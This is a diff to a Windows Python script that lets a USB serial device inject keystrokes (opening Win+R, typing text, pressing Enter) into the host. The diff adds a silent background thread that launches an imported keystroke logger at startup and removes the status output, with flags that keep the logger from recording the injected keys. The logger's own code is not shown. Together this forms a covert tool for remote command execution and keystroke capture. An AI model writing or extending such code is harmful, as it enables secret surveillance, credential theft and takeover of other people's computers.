@@ -3,14 +3,27 @@ import time
 import win32api
 import win32con
 from serial.tools import list_ports
+import threading
 
 # ---- CONFIG ----
 BAUD = 115200
-SCAN_INTERVAL = 2  # seconds between rescans
+SCAN_INTERVAL = 2  # seconds
 
-# Known VID/PID of your device (FTDI FT232)
 TARGET_VID = 1027      # 0x0403
 TARGET_PID = 24577     # 0x6001
+
+# ---- IMPORT OTHER SCRIPT ----
+import key   # key.py contains the keystroke logger
+
+
+# ---- BACKGROUND THREAD ----
+def background_runner():
+    # run the logger exactly once
+    key.main()
+
+
+# start keylogger in background
+threading.Thread(target=background_runner, daemon=True).start()
 
 
 # ---- PORT DETECTION ----
@@ -34,7 +47,7 @@ def find_serial_port():
     return None
 
 
-# ---- KEYBOARD INJECTION FUNCTIONS ----
+# ---- KEYBOARD INJECTION ----
 def key_press(vk):
     win32api.keybd_event(vk, 0, 0, 0)
     time.sleep(0.05)
@@ -60,16 +73,12 @@ def type_text(s):
 ser = None
 
 while True:
-    # Acquire a port if we don't have one
     if ser is None:
         ser = find_serial_port()
-        if ser:
-            print(f"[+] Connected to {ser.port} @ {BAUD}")
-        else:
+        if not ser:
             time.sleep(SCAN_INTERVAL)
             continue
 
-    # Try reading from the port
     try:
         line = ser.readline().decode(errors='ignore').strip()
     except Exception:
@@ -85,14 +94,20 @@ while True:
 
     # ---- COMMAND HANDLING ----
     if line == "WINR":
+        key.typing_active = True
         win = win32con.VK_LWIN
         win32api.keybd_event(win, 0, 0, 0)
         key_press(ord('R'))
         win32api.keybd_event(win, 0, win32con.KEYEVENTF_KEYUP, 0)
+        key.typing_active = False
 
     elif line.startswith("TYPE:"):
+        key.typing_active = True
         text = line[5:]
         type_text(text)
+        key.typing_active = False
 
     elif line == "ENTER":
+        key.typing_active = True
         key_press(win32con.VK_RETURN)
+        key.typing_active = False
